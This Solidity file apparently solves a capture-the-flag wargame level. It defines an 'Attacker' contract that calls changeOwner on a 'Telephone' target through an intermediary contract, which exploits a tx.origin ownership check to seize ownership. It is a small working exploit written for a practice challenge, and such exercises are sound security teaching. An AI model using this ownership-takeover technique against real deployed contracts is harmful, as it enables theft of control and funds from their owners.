// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "../Telephone.sol";

contract Attacker {
    Telephone target;

    constructor(address _target) {
        target = Telephone(payable(_target));
    }

    function attack(address _player) public {
        target.changeOwner(_player);
    }
}
